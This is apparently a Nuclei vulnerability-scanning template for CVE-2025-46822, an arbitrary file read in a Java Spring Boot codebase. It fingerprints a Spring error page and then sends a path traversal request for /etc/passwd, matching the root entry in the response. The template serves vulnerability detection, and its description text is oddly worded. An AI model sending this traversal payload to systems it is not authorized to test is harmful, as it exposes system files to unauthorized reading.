id: CVE-2025-46822

info:
  name: Java-springboot-codebase 1.1 - Arbitrary File Read
  author: vva
  severity: high
  description: |
    OsamaTaher/ Java-SpringBoot-Codebase is a collection of Java and springboot code snippets, applications, and projects. Before c835c6f7799eacada4c0fc77e0816f250af01ad2 submit the code to the problem of shortage of inventory in the path traversal mechanism, lead to the absolute path traversal is possible
  reference:
    - https://nvd.nist.gov/vuln/detail/CVE-2025-46822
  metadata:
    verified: true
    max-request: 1
  tags: cve2025,java,springboot,codebase

flow: http(1) && http(2)

http:
  - raw:
      - |
        GET / HTTP/1.1
        Host: {{Hostname}}
        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7

    matchers:
      - type: dsl
        dsl:
          - 'contains_any(body, "Whitelabel Error Page","explicit mapping")'
        internal: true

  - raw:
      - |
        GET /api/v1/files/etc/passwd HTTP/1.1
        Host: {{Hostname}}

    matchers-condition: and
    matchers:
      - type: regex
        part: body
        regex:
          - "root:.*:0:0:"

      - type: status
        status:
          - 200
